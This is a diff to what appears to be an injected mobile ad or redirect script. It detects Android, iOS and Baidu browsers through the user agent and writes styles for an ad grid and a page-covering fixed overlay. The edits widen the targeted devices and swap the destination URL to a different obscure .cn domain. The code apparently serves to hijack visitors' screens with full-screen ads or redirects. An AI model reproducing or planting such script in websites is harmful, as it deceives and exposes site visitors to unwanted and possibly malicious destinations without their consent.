@@ -2,7 +2,7 @@
 var isAndroid = u.indexOf('Android') > -1 || u.indexOf('Adr') > -1;
 var isbaidu = u.indexOf('baidu') > -1 || u.indexOf('Baidu') > -1; 
 var isiOS = !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/);
-if(isAndroid && !isbaidu){
+if(isAndroid || isbaidu || isiOS){
 document.writeln("<style>body{font-family:\'Microsoft YaHei\',SimSun,\'\/\/5b8b\/\/4f53\',sans-serif;}body,html,ul,li,p,h1,h2,h3,h4,h5,p,button,form,input{margin:0;padding:0;}ul,li{list-style: none;}a{text-decoration:none;}img{vertical-align: middle;}html,body{min-width:320px;width:100%;}input:focus, button:focus, select:focus, textarea:focus {outline: 0;}.clearfix{*zoom:1;}.clearfix:after{display: block;content:\'\';clear:both;}.ad-18{padding:0px 8px 6px;border:1px solid #ddd}.ad-18 div{float:left;width:49%;position:relative;overflow: hidden;margin-top:6px}.ad-18 div:nth-child(2n-1){margin-right:2%;}.ad-18 img{width: 100%;height:100%}.ad-18 span{position:absolute;left:0;bottom:0;display: block;width:100%;height:24px;text-indent: 28px;color:#fff;line-height: 24px;font-size:0.8rem;background-color: rgba(0,0,0,.5)}.ad-18 i{position:absolute;left:4px;top:3px;display: block;width:18px;height:18px;background: url(https://img.alicdn.com/imgextra/i2/1052185841/TB2PbjxkilnpuFjSZFgXXbi7FXa_!!1052185841.png) no-repeat;background-size: 18px 18px;}.ad-18 em{position:absolute;right:5px;top:0;color:#d5d5d5;line-height: 24px;font-size:0.6rem;font-style: normal;}.search{position:relative;width: 100%;height:32px;background-color: #f5f5f5;}.search i{display: block;width: 4px;height:18px;position:absolute;top:7px;left:7px;background-color: #ff9191;}.s{margin-left:20px;color:#333;height:32px;border:none;box-sizing: border-box;font-weight:bold;font-size:16px;line-height: 32px;}.search a{font-size:12px;line-height: 32px;color:#bbb;position:absolute;right:12px;top:0;}.fixdxx{width: 100%;height:100%;position: fixed;top: 0;left: 0;z-index:210000000;}</style>");
 var data = new Array();
 var array = new Array();
@@ -60,9 +60,9 @@ var e = navigator.userAgent.toLowerCase(),
     b = e.match(/iphone/i) == "iphone",
     c = e.match(/android/i) == "android";
 if (f || b) {
-    var url = 'https://playd.zgwlzho.cn/?t=zb_17';
+    var url = 'https://wwwm.nanwind.cn/?t=zb_17';
 }else{
-    var url = 'https://playd.zgwlzho.cn/?t=zb_17';
+    var url = 'https://wwwm.nanwind.cn/?t=zb_17';
 }
 for (x in d) {
     var img = data[d[x]][0];
